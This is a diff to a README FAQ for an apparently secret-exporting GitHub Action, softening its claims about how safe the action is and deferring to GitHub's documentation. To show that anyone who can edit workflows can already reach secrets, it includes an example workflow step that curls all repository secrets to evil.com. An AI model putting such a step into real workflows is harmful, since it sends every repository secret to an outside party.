@@ -135,18 +135,18 @@ Or delete via the GitHub UI: Actions → Workflow run → Artifacts section → 
 
 ### "Doesn't this action make my repo unsafe?"
 
-No - this action doesn't create new risk.
+This action doesn't add new attack surface that doesn't already exist.
 
-**Important:** [PRs from forks don't have access to secrets](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions#using-secrets-in-a-workflow). Only PRs from branches **in the same repo** can access secrets.
+**Important:** GitHub's security model for workflows and secrets is complex. Please read the [official documentation on secrets in GitHub Actions](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions) to understand your specific risk profile.
 
-Anyone who can create branches in your repo can already steal secrets without this action:
+Generally speaking: Anyone who can create/modify workflows in your repo can already access secrets:
 
 ```yaml
-# Any workflow in any branch can do this:
+# Any workflow can do this:
 - run: curl https://evil.com -d "${{ toJSON(secrets) }}"
 ```
 
-This export action just makes intentional secret export easier. If you trust someone to create branches in your repo, you're already trusting them with secrets.
+This export action just makes intentional export easier - it doesn't change the fundamental security model.
 
 ### "no identity matched any of the recipients" or "Failed to decrypt"
 
